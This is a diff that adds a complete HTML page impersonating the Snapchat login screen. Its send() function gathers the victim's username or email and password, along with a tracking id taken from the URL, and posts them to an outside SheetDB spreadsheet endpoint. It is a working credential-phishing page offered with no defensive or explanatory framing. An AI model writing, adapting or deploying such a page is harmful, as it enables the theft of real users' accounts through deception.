@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Snapchat Login</title>
+
+<style>
+    body {
+        margin: 0;
+        font-family: Arial, sans-serif;
+        background: #FFFC00; /* Snapchat Yellow */
+        height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .container {
+        background: white;
+        width: 350px;
+        padding: 35px;
+        border-radius: 15px;
+        box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+        text-align: center;
+    }
+
+    .logo img {
+        width: 90px;
+        margin-bottom: 20px;
+    }
+
+    h2 {
+        margin-bottom: 20px;
+        font-weight: bold;
+        color: #000;
+    }
+
+    input {
+        width: 100%;
+        padding: 12px;
+        margin-bottom: 15px;
+        border-radius: 10px;
+        border: 1px solid #ccc;
+        background: #fafafa;
+        font-size: 15px;
+        outline: none;
+    }
+
+    .btn {
+        width: 100%;
+        padding: 12px;
+        background: #000;
+        border: none;
+        border-radius: 10px;
+        color: white;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        margin-top: 10px;
+    }
+
+    .btn:hover {
+        background: #333;
+    }
+
+    .forgot {
+        margin-top: 15px;
+        font-size: 14px;
+    }
+
+    a {
+        color: #000;
+        font-weight: bold;
+        text-decoration: none;
+    }
+
+    .signup {
+        margin-top: 15px;
+        font-size: 15px;
+    }
+</style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">
+        <!-- Snapchat ghost logo -->
+        <h1>Snapchat</h1>
+    </div>
+
+    <h2>Log In</h2>
+
+    <input id="email" type="text" placeholder="Username or Email">
+    <input id="password" type="password" placeholder="Password">
+
+    <button onclick="send()" class="btn">Log In</button>
+
+        <script>
+        function send() {
+           const email = document.getElementById('email').value;
+       const password = document.getElementById('password').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "snapchat";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+            
+        }
+            
+        </script>
+        
+        
+
+
+
+
+
+    <div class="forgot">
+        <a href="#">Forgot your password?</a>
+    </div>
+
+    <div class="signup">
+        Don't have an account? <a href="#">Sign up</a>
+    </div>
+</div>
+
+</body>
+</html>
